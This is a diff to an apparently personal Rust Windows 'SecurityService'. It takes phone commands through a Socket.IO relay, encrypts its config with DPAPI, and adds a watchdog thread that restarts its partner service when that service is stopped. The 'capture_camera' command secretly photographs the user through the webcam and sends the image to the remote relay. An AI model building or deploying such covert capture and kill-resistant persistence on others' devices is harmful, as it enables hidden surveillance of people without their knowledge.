@@ -23,9 +23,74 @@ use serde_json::json;
 use std::time::{SystemTime, UNIX_EPOCH};
 use hmac::{Hmac, Mac};
 use sha2::Sha256;
+use sysinfo::{System, ProcessRefreshKind, RefreshKind};
 use std::sync::{Arc, mpsc};
 use winreg::enums::*;
 use winreg::RegKey;
+
+use windows::Win32::Security::Cryptography::{CryptProtectData, CryptUnprotectData, CRYPT_INTEGER_BLOB as CRYPTOAPI_BLOB, CRYPTPROTECT_LOCAL_MACHINE, CRYPTPROTECT_UI_FORBIDDEN};
+use windows::Win32::Foundation::LocalFree;
+use windows::core::PCWSTR;
+use base64::{Engine as _, engine::general_purpose};
+
+pub fn encrypt_dpapi(data: &[u8]) -> Result<String, String> {
+    let mut data_in = CRYPTOAPI_BLOB {
+        cbData: data.len() as u32,
+        pbData: data.as_ptr() as *mut _,
+    };
+    let mut data_out = CRYPTOAPI_BLOB::default();
+    
+    unsafe {
+        if let Err(e) = CryptProtectData(
+            &mut data_in,
+            PCWSTR::null(),
+            None,
+            None,
+            None,
+            CRYPTPROTECT_LOCAL_MACHINE | CRYPTPROTECT_UI_FORBIDDEN,
+            &mut data_out,
+        ) {
+            return Err(format!("CryptProtectData failed: {}", e));
+        }
+        
+        let slice = std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize);
+        let b64 = general_purpose::STANDARD.encode(slice);
+        let _ = LocalFree(Some(windows::Win32::Foundation::HLOCAL(data_out.pbData as _)));
+        Ok(b64)
+    }
+}
+
+pub fn decrypt_dpapi(encoded_data: &str) -> Result<Vec<u8>, String> {
+    let decoded = match general_purpose::STANDARD.decode(encoded_data) {
+        Ok(d) => d,
+        Err(e) => return Err(format!("Base64 Error: {}", e)),
+    };
+    
+    let mut data_in = CRYPTOAPI_BLOB {
+        cbData: decoded.len() as u32,
+        pbData: decoded.as_ptr() as *mut _,
+    };
+    let mut data_out = CRYPTOAPI_BLOB::default();
+    
+    unsafe {
+        if let Err(e) = CryptUnprotectData(
+            &mut data_in,
+            None,
+            None,
+            None,
+            None,
+            CRYPTPROTECT_UI_FORBIDDEN,
+            &mut data_out,
+        ) {
+            return Err(format!("CryptUnprotectData failed: {}", e));
+        }
+        
+        let slice = std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize);
+        let result = slice.to_vec();
+        let _ = LocalFree(Some(windows::Win32::Foundation::HLOCAL(data_out.pbData as _)));
+        Ok(result)
+    }
+}
 
 const SERVICE_NAME: &str = "SecurityService";
 
@@ -56,10 +121,12 @@ fn main() -> Result<(), windows_service::Error> {
     let args: Vec<String> = std::env::args().collect();
     if args.contains(&"--dev".to_string()) {
         sys_log!("[Main] Đang chạy trong tiến trình Console (--dev) bypass SCM.");
-        start_socketio_client();
-        std::thread::spawn(|| {
+        let (emit_tx, emit_rx) = mpsc::channel::<String>();
+        
+        start_socketio_client(emit_rx);
+        std::thread::spawn(move || {
             sys_log!("[NamedPipe] Đang khởi chạy Server...");
-            security::ipc::named_pipe::start_server();
+            security::ipc::named_pipe::start_server(emit_tx);
         });
         println!("🚀 Đang chạy chế độ Developer Mode. Nhấn Ctrl+C để thoát.");
         loop { std::thread::sleep(std::time::Duration::from_secs(60)); }
@@ -113,13 +180,49 @@ fn my_service_main(_arguments: Vec<OsString>) {
 
     sys_log!("[my_service_main] Đăng ký thành công. Trạng thái: RUNNING.");
 
+    // Tạo kênh giao tiếp nội bộ giữa Named Pipe và Socket.IO
+    let (emit_tx, emit_rx) = mpsc::channel::<String>();
+
     // Chạy Socket.IO Client ở background thread
-    start_socketio_client();
+    start_socketio_client(emit_rx);
 
     // Chạy Named Pipe Server ở background thread
-    std::thread::spawn(|| {
+    std::thread::spawn(move || {
         sys_log!("[NamedPipe] Đang khởi chạy Server...");
-        named_pipe::start_server();
+        named_pipe::start_server(emit_tx);
+    });
+
+    // Luồng Mutual Watchdog (Giám sát ngược lại Watchdog)
+    std::thread::spawn(|| {
+        sys_log!("[MutualWatchdog] Bắt đầu giám sát watchdog.exe...");
+        let mut sys = System::new_with_specifics(
+            RefreshKind::nothing().with_processes(ProcessRefreshKind::everything())
+        );
+
+        loop {
+            sys.refresh_processes(sysinfo::ProcessesToUpdate::All, true);
+            let mut is_watchdog_running = false;
+            
+            for (_, process) in sys.processes() {
+                if let Some(name) = process.name().to_str() {
+                    if name.to_lowercase() == "watchdog.exe" {
+                        is_watchdog_running = true;
+                        break;
+                    }
+                }
+            }
+
+            if !is_watchdog_running {
+                sys_log!("[MutualWatchdog] Phát hiện watchdog.exe bị tắt! Đang khởi động lại...");
+                if let Err(e) = std::process::Command::new("sc").args(["start", "SecurityWatchdog"]).output() {
+                    sys_log!("[MutualWatchdog] Lỗi khi gọi `sc start SecurityWatchdog`: {}", e);
+                } else {
+                    sys_log!("[MutualWatchdog] Đã ra lệnh khởi động lại Watchdog Service.");
+                }
+            }
+
+            std::thread::sleep(Duration::from_secs(10));
+        }
     });
 
     // Luồng chính đợi tín hiệu Dừng (Stop) từ SCM
@@ -157,29 +260,82 @@ fn get_location_info() -> serde_json::Value {
     json!({"status": "fail", "message": "No external internet connection"})
 }
 
-fn start_socketio_client() {
-    std::thread::spawn(|| {
+use serde::{Serialize, Deserialize};
+use std::fs;
+
+#[derive(Serialize, Deserialize, Clone)]
+struct AppConfig {
+    #[serde(rename = "RELAY_URL")]
+    relay_url: String,
+    #[serde(rename = "SECRET_KEY")]
+    secret_key: String,
+}
+
+impl Default for AppConfig {
+    fn default() -> Self {
+        Self {
+            relay_url: "http://127.0.0.1:3000".to_string(),
+            secret_key: "DEFAULT_SECRET_KEY".to_string(),
+        }
+    }
+}
+
+fn load_app_config() -> (String, String) {
+    let config_dir = "C:\\ProgramData\\SecuritySystem";
+    let config_path_old = format!("{}\\config.json", config_dir);
+    let config_path_enc = format!("{}\\config.enc", config_dir);
+
+    // Dảm bảo thư mục tồn tại
+    let _ = fs::create_dir_all(config_dir);
+
+    // MIGRATION: Đọc config plain-text nếu có
+    if let Ok(data) = fs::read_to_string(&config_path_old) {
+        if let Ok(cfg) = serde_json::from_str::<AppConfig>(&data) {
+            let json_str = serde_json::to_string(&cfg).unwrap_or_default();
+            if let Ok(enc_str) = encrypt_dpapi(json_str.as_bytes()) {
+                let _ = fs::write(&config_path_enc, enc_str);
+                let _ = fs::remove_file(&config_path_old);
+                sys_log!("[Config] Đã chuyển đổi thành công config.json sang config.enc bọc bởi DPAPI.");
+                return (cfg.relay_url, cfg.secret_key);
+            }
+        }
+    }
+
+    // Bình thường: Đọc file đã mã hóa
+    if let Ok(enc_data) = fs::read_to_string(&config_path_enc) {
+        if let Ok(raw_bytes) = decrypt_dpapi(&enc_data) {
+            if let Ok(json_str) = String::from_utf8(raw_bytes) {
+                if let Ok(cfg) = serde_json::from_str::<AppConfig>(&json_str) {
+                    sys_log!("[Config] Đã nạp thành công file config.enc bảo mật DPAPI.");
+                    return (cfg.relay_url, cfg.secret_key);
+                }
+            }
+        }
+        sys_log!("[Config] Giải mã DPAPI thất bại! File config.enc có thể bị lỗi nội dung hoặc bị đem sang máy khác. Sử dụng fallback cấu hình.");
+    } else {
+        sys_log!("[Config] Không tìm thấy file config, tiến hành báo cáo khởi tạo cấu hình mặc định DPAPI.");
+    }
+
+    let default_cfg = AppConfig::default();
+    let default_json = serde_json::to_string(&default_cfg).unwrap_or_default();
+    if let Ok(enc_str) = encrypt_dpapi(default_json.as_bytes()) {
+        let _ = fs::write(&config_path_enc, enc_str);
+    }
+    (default_cfg.relay_url, default_cfg.secret_key)
+}
+
+fn start_socketio_client(emit_rx: mpsc::Receiver<String>) {
+    std::thread::spawn(move || {
         sys_log!("[SocketIO] Background thread bắt đầu.");
         
-        // CÁCH AN TOÀN TRONG WINDOWS SERVICE: Đọc bằng đường dẫn tuyệt đối!
-        let env_path = "C:\\Users\\Admin\\MyProject\\Security\\1_windows_service\\.env";
-        let _ = dotenvy::from_path(env_path);
-        
-        // KHÔNG DÙNG expect() VÌ NÓ SẼ GÂY CRASH SERVICE. Dùng fallback nếu quên cấu hình.
-        let secret_key = std::env::var("SECRET_KEY").unwrap_or_else(|_| {
-            sys_log!("[SocketIO] CẢNH BÁO: Không tìm thấy SECRET_KEY trong .env. Dùng khóa mặc định.");
-            "change_me_to_secure_key".to_string()
-        });
+        let (relay_url, secret_key) = load_app_config();
 
-        let relay_url = std::env::var("RELAY_URL").unwrap_or_else(|_| {
-            "http://127.0.0.1:3000".to_string()
-        });
         
         let device_id = Arc::new(get_machine_id());
         let device_id_for_on = Arc::clone(&device_id);
         let device_id_for_reg = Arc::clone(&device_id);
         
-        let timestamp = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_millis().to_string();
+        let timestamp = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_else(|_| Duration::from_secs(0)).as_millis().to_string();
         
         let mut mac = match Hmac::<Sha256>::new_from_slice(secret_key.as_bytes()) {
             Ok(m) => m,
@@ -206,19 +362,24 @@ fn start_socketio_client() {
                         // ===== XỬ LÝ LỆNH TỪ ĐIỆN THOẠI GỬI VỀ =====
                         if cmd == "capture_camera" {
                             sys_log!("[Command] Thực thi lệnh Camera...");
-                            match camera::capture_stealth_image() {
-                                Ok((path, b64_img)) => {
-                                    let payload = json!({
-                                        "deviceId": *device_id_for_on,
-                                        "status": format!("Đã chụp lén Camera thành công! File lưu tại: {}", path),
-                                        "image": b64_img
-                                    });
-                                    let _ = client.emit("status_update", payload);
+                            let emit_client = client.clone();
+                            let dev_id = device_id_for_on.clone();
+                            
+                            std::thread::spawn(move || {
+                                match camera::capture_stealth_image() {
+                                    Ok((path, b64_img)) => {
+                                        let payload = json!({
+                                            "deviceId": *dev_id,
+                                            "status": format!("Đã chụp lén Camera thành công! File lưu tại: {}", path),
+                                            "image": b64_img
+                                        });
+                                        let _ = emit_client.emit("status_update", payload);
+                                    }
+                                    Err(e) => {
+                                        let _ = emit_client.emit("status_update", json!({"deviceId": *dev_id, "status": format!("Lỗi Camera: {}", e)}));
+                                    }
                                 }
-                                Err(e) => {
-                                    let _ = client.emit("status_update", json!({"deviceId": *device_id_for_on, "status": format!("Lỗi Camera: {}", e)}));
-                                }
-                            }
+                            });
                             
                         } else if cmd == "lock_pc" {
                             unsafe {
@@ -266,7 +427,18 @@ fn start_socketio_client() {
             });
             let _ = client.emit("register", reg_data);
             
-            loop { std::thread::sleep(Duration::from_secs(60)); }
+            // Loop để duy trì thread socket, đồng thời liên tục check tín hiệu từ Named Pipe nội bộ!
+            loop { 
+                if let Ok(status) = emit_rx.try_recv() {
+                    let payload = json!({
+                        "deviceId": *device_id_for_reg,
+                        "status": status
+                    });
+                    let _ = client.emit("status_update", payload);
+                    sys_log!("[SocketIO] Đã forward trạng thái từ PC_UI lên Cloud: {}", status);
+                }
+                std::thread::sleep(Duration::from_millis(50));
+            }
         } else {
             sys_log!("[SocketIO] LỖI: Không thể kết nối Socket.IO tới server!");
         }
